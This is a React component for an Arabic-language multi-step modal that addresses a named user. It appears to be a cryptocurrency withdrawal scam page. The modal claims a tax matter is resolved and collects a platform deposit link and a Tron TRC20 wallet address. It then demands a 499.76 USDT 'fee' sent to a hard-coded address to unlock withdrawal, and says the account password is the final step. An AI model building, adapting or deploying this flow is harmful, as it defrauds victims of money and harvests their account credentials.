
import React, { useState } from 'react';

interface MultiStepModalProps {
  onClose: () => void;
}

const MultiStepModal: React.FC<MultiStepModalProps> = ({ onClose }) => {
  const [step, setStep] = useState(1);
  const [platformLink, setPlatformLink] = useState('');
  const [walletAddress, setWalletAddress] = useState('');

  const nextStep = () => setStep(prev => prev + 1);

  const renderStep = () => {
    switch (step) {
      case 1:
        return (
          <div className="space-y-4 text-right" dir="rtl">
            <h3 className="text-xl font-bold text-[#F5A623]">أهلاً بك rahafmasalma</h3>
            <p className="text-gray-200 leading-relaxed">
              تم حل أمر الضريبه يمكن سحب جميع العملات يرجى عدم مشاركه الرابط الخاص بحسابك نحن غير مسؤولين عن فقدان العملات ان تم تسريبه.
            </p>
            <p className="text-sm text-gray-400">
              الآن اضغط التالي وقم بوضع رابط المنصه mini pro لقسم الايداع حصراً.
            </p>
            <button 
              onClick={nextStep}
              className="w-full bg-[#F5A623] text-black font-bold py-3 rounded-lg hover:bg-[#d98f1e] transition-colors"
            >
              التالي
            </button>
          </div>
        );
      case 2:
        return (
          <div className="space-y-4 text-right" dir="rtl">
            <h3 className="text-xl font-bold text-[#F5A623]">رابط منصة mini pro</h3>
            <p className="text-gray-200">يرجى إدخال رابط قسم الإيداع الخاص بمنصة mini pro:</p>
            <input 
              type="text" 
              value={platformLink}
              onChange={(e) => setPlatformLink(e.target.value)}
              placeholder="ضع الرابط هنا..."
              className="w-full bg-gray-800 border border-gray-700 text-white p-3 rounded-lg focus:outline-none focus:border-[#F5A623]"
            />
            <button 
              onClick={nextStep}
              disabled={!platformLink}
              className="w-full bg-[#F5A623] text-black font-bold py-3 rounded-lg hover:bg-[#d98f1e] transition-colors disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 3:
        return (
          <div className="space-y-4 text-right" dir="rtl">
            <h3 className="text-xl font-bold text-[#F5A623]">عنوان محفظة Tron TRC 20</h3>
            <p className="text-gray-200">يرجى إدخال رابط محفظة Tron TRC 20 الخاصة بك:</p>
            <input 
              type="text" 
              value={walletAddress}
              onChange={(e) => setWalletAddress(e.target.value)}
              placeholder="T..."
              className="w-full bg-gray-800 border border-gray-700 text-white p-3 rounded-lg focus:outline-none focus:border-[#F5A623]"
            />
            <button 
              onClick={nextStep}
              disabled={!walletAddress}
              className="w-full bg-[#F5A623] text-black font-bold py-3 rounded-lg hover:bg-[#d98f1e] transition-colors disabled:opacity-50"
            >
              التالي
            </button>
          </div>
        );
      case 4:
        return (
          <div className="space-y-4 text-right max-h-[70vh] overflow-y-auto pr-2" dir="rtl">
            <h3 className="text-xl font-bold text-[#F5A623]">أهلاً بك rahafmasalma</h3>
            <p className="text-gray-200 leading-relaxed text-sm">
              بقي أمر إيداع مبلغ <span className="text-[#F5A623] font-bold">499.76 عملة USDT TRC 20</span> لفتح قناة السحب. 
              هذه الضريبه هي اجور منصتنا وليس لها أي صله بمنصه mini pro وتم تخفيض الضريبة بتسويه من منصة mini pro بموجب اتفاق ضمن برتكول الخاص بالمنصه الاساسيه.
            </p>
            <div className="bg-gray-900 p-4 rounded-lg border border-dashed border-[#F5A623]">
              <p className="text-xs text-gray-400 mb-2">حول المبلغ إلى هذا العنوان:</p>
              <p className="text-xs font-mono break-all text-white select-all bg-black p-2 rounded">
                TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai
              </p>
            </div>
            <button 
              onClick={nextStep}
              className="w-full bg-[#F5A623] text-black font-bold py-3 rounded-lg hover:bg-[#d98f1e] transition-colors"
            >
              تم الإيداع
            </button>
          </div>
        );
      case 5:
        return (
          <div className="space-y-6 text-center" dir="rtl">
            <div className="flex justify-center">
              <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-[#F5A623]"></div>
            </div>
            <h3 className="text-xl font-bold text-white">الرجاء الانتظار للتأكد من عملية الإيداع</h3>
            <p className="text-gray-300 text-sm leading-relaxed">
              سيتم توجهيك للخطوة النهائيه بعد تأكيد الايداع لوضع كلمة المرور وستكون اخر خطوة تفصل عن السحب. الخطوة التاليه يجب وضع كلمة المرور الحساب.
            </p>
          </div>
        );
      default:
        return null;
    }
  };

  return (
    <div className="fixed inset-0 z-[110] flex items-center justify-center p-4">
      {/* Backdrop */}
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm"></div>
      
      {/* Modal Content */}
      <div className="relative bg-[#1a1a1a] border border-gray-800 w-full max-w-md p-8 rounded-2xl shadow-2xl animate-fade-in">
        <div className="absolute -top-12 left-1/2 -translate-x-1/2">
           <div className="bg-[#F5A623] p-4 rounded-full shadow-lg">
             <svg className="w-8 h-8 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
             </svg>
           </div>
        </div>
        
        <div className="mt-4">
          {renderStep()}
        </div>

        {/* Step Indicator */}
        {step < 5 && (
          <div className="mt-6 flex justify-center space-x-1 space-x-reverse">
            {[1, 2, 3, 4].map((i) => (
              <div 
                key={i} 
                className={`h-1 w-8 rounded-full transition-colors ${step >= i ? 'bg-[#F5A623]' : 'bg-gray-700'}`}
              ></div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
};

export default MultiStepModal;
